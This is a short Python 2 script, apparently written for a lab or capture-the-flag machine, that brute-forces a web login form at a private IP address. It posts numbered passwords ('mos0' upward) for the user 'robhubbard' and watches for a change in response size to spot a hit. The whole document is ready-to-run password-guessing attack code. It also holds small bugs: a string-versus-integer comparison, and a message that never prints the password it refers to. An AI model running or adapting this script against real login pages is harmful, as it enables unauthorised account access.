#!/usr/bin/python
import requests

lastLen = '0'
url = 'http://192.168.234.167/commodore64/index.php'
user = 'robhubbard'
for i in xrange(0,9999):
        passwd = 'mos{}'.format(i)
        resp = requests.post(url,files={'input_username': (None, user),'input_password':(None, passwd),'path': (None,'')})
        if lastLen != len(resp.text):
                print len(resp.text)
                print "Using {} resulted in a different page size"
                lastLen = len(resp.text)